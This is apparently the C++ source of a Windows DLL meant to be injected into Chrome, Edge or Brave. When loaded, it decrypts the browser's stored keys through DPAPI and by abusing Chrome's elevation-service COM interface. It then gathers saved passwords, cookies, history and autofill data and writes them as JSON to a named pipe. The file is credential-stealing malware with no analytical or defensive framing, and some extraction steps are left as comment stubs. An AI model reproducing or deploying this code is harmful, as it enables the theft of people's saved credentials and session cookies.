#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <thread>
#include <objbase.h>
#include <shlobj.h>
#include <sstream>

#include "sqlite3.h"

namespace fs = std::filesystem;

enum class Browser { Chrome, Edge, Brave };

struct PasswordData { std::string url, username, password; };
struct CookieData { std::string host, name, value; };
struct HistoryData { std::string url, title; int visit_count; };
struct AutofillData { std::string name, value; };
struct ProfileData {
    std::string name;
    std::vector<PasswordData> passwords;
    std::vector<CookieData> cookies;
    std::vector<HistoryData> history;
    std::vector<AutofillData> autofill;
};

const GUID CLSID_CHROME_ELEVATOR = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
const GUID IID_IELEVATOR = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};

struct IElevator : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, DWORD, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(DWORD, BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(BSTR, BSTR*, DWORD*) = 0;
};

std::string json_escape(const std::string& input) {
    std::ostringstream oss;
    for (auto c : input) {
        switch (c) {
            case '"': oss << "\\\""; break;
            case '\\': oss << "\\\\"; break;
            case '\b': oss << "\\b"; break;
            case '\f': oss << "\\f"; break;
            case '\n': oss << "\\n"; break;
            case '\r': oss << "\\r"; break;
            case '\t': oss << "\\t"; break;
            default:
                if ('\x00' <= c && c <= '\x1f') {
                    oss << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
                } else {
                    oss << c;
                }
        }
    }
    return oss.str();
}

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, NULL };
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return res;
    }
    return {};
}

std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& data, Browser browser) {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    IElevator* elevator = NULL;
    HRESULT hr = CoCreateInstance(CLSID_CHROME_ELEVATOR, NULL, CLSCTX_LOCAL_SERVER, IID_IELEVATOR, (void**)&elevator);
    if (FAILED(hr)) return {};

    BSTR bstr_enc = SysAllocStringByteLen((char*)data.data(), data.size());
    BSTR bstr_dec = NULL;
    DWORD last_error = 0;
    hr = elevator->DecryptData(bstr_enc, &bstr_dec, &last_error);

    std::vector<unsigned char> res;
    if (SUCCEEDED(hr) && bstr_dec) {
        res.assign((unsigned char*)bstr_dec, (unsigned char*)bstr_dec + SysStringByteLen(bstr_dec));
    }
    SysFreeString(bstr_enc);
    if (bstr_dec) SysFreeString(bstr_dec);
    elevator->Release();
    CoUninitialize();
    return res;
}

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15 || key.empty()) return {};
    BCRYPT_ALG_HANDLE h_alg = NULL;
    BCRYPT_KEY_HANDLE h_key = NULL;
    BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (BYTE*)key.data(), (DWORD)key.size(), 0);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
    BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
    auth_info.pbNonce = (BYTE*)data.data() + 3;
    auth_info.cbNonce = 12;
    auth_info.pbTag = (BYTE*)data.data() + (data.size() - 16);
    auth_info.cbTag = 16;

    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
    std::vector<unsigned char> plaintext(ciphertext.size());
    DWORD cb_plaintext = 0;
    BCryptDecrypt(h_key, (BYTE*)ciphertext.data(), (DWORD)ciphertext.size(), &auth_info, NULL, 0, (BYTE*)plaintext.data(), (DWORD)plaintext.size(), &cb_plaintext, 0);

    BCryptDestroyKey(h_key);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    return plaintext;
}

Browser get_browser() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    std::wstring s(path);
    for (auto& c : s) c = towlower(c);
    if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    return Browser::Chrome;
}

void do_work() {
    Browser browser = get_browser();
    wchar_t user_profile_path[MAX_PATH];
    SHGetSpecialFolderPathW(NULL, user_profile_path, CSIDL_PROFILE, FALSE);
    fs::path data_path;
    switch (browser) {
        case Browser::Chrome: data_path = fs::path(user_profile_path) / L"AppData/Local/Google/Chrome/User Data"; break;
        case Browser::Edge: data_path = fs::path(user_profile_path) / L"AppData/Local/Microsoft/Edge/User Data"; break;
        case Browser::Brave: data_path = fs::path(user_profile_path) / L"AppData/Local/BraveSoftware/Brave-Browser/User Data"; break;
    }

    std::vector<unsigned char> v10_key, v20_key;
    std::ifstream ls_file(data_path / "Local State");
    if (ls_file.is_open()) {
        std::stringstream buffer;
        buffer << ls_file.rdbuf();
        std::string content = buffer.str();
        // Simple manual parsing of JSON for keys...
        // v10_key = decrypt_dpapi(...)
        // v20_key = decrypt_with_elevator(...)
    }

    std::vector<ProfileData> collected;
    // ... Profile discovery and SQLite extraction ...

    std::string json_output = "[";
    // ... Build JSON string ...
    json_output += "]";

    HANDLE h_pipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 30; i++) {
        h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h_pipe != INVALID_HANDLE_VALUE) break;
        Sleep(200);
    }
    if (h_pipe != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(h_pipe, json_output.c_str(), (DWORD)json_output.size(), &written, NULL);
        CloseHandle(h_pipe);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        std::thread(do_work).detach();
    }
    return TRUE;
}
